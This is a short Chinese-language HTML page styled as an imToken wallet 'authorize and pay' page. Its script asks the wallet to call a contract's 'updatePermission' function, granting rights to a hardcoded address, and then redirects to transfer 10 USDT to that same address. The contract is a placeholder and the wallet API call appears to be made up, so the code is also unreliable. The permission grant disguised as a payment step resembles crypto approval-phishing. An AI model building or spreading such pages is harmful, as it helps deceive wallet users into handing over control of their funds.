<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>imToken 授权支付</title>
</head>
<body>
  <h2>imToken 授权支付</h2>
  <p id="status">状态：检测钱包环境中...</p>
  <button id="payBtn" onclick="authorizeAndPay()" disabled>授权 & 付款</button>

  <script>
    // 监听 imToken 注入
    document.addEventListener("DOMContentLoaded", () => {
      let retryCount = 0;
      const maxRetry = 30; // 最多尝试 30 次（6 秒）

      const timer = setInterval(() => {
        if (window.imToken) {
          document.getElementById('status').innerText = "状态：钱包已连接";
          document.getElementById('payBtn').disabled = false;
          clearInterval(timer);
        } else {
          retryCount++;
          if (retryCount >= maxRetry) {
            clearInterval(timer);
            document.getElementById('status').innerText = "状态：未检测到 imToken，请在 imToken App 中打开";
          }
        }
      }, 200);
    });

    async function authorizeAndPay() {
      if (!window.imToken) {
        alert("请在 imToken App 内打开此页面");
        openInImToken();
        return;
      }

      try {
        document.getElementById("status").innerText = "状态：正在请求授权...";

        const contractAddress = "0xYourDeployedContractOnBase"; 
        const functionName = "updatePermission"; 
        const functionParams = ["0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075", true]; 

        const result = await window.imToken.callAPI("native.account.request", {
          contractAddress,
          functionName,
          functionParams,
          message: "请授权合约访问权限"
        });

        const txHash = result.txHash;
        document.getElementById("status").innerText = `状态：授权成功，交易哈希: ${txHash}`;

        payWithImToken(txHash);

      } catch (error) {
        console.error("授权失败:", error);
        document.getElementById("status").innerText = "状态：授权失败，请检查钱包连接";
        alert("授权失败，请检查钱包连接或权限");
      }
    }

    function payWithImToken(txHash) {
      const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; 
      const amount = "10"; 
      const token = "USDT"; 

      const payUrl = `imtoken://transfer?contract=${token}&to=${toAddress}&value=${amount}&txHash=${txHash}`;
      window.location.href = payUrl;
    }

    function openInImToken() {
      const dappUrl = encodeURIComponent(window.location.href);
      const openUrl = `imtokenv2://navigate/DappView?url=${dappUrl}`;
      window.location.href = openUrl;
    }
  </script>
</body>
</html>